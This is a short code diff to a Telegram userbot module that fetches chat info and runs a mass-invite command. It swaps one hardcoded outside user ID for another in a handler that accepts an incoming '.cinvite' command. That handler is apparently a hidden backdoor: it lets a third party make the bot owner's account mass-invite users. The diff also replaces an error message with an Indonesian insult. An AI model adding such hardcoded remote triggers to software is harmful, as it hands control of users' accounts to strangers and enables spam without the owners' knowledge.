@@ -38,7 +38,7 @@ async def get_chatinfo(event):
         try:
             chat_info = await event.client(GetFullChannelRequest(chat))
         except ChannelInvalidError:
-            await event.reply("`Invalid channel/group`")
+            await event.reply("`MASUKIN ID GRUP/CHANNEL YANG BENER TOLOL`")
             return None
         except ChannelPrivateError:
             await event.reply("`This is a private channel/group or I am banned from there`")
@@ -53,7 +53,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=5090127753, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
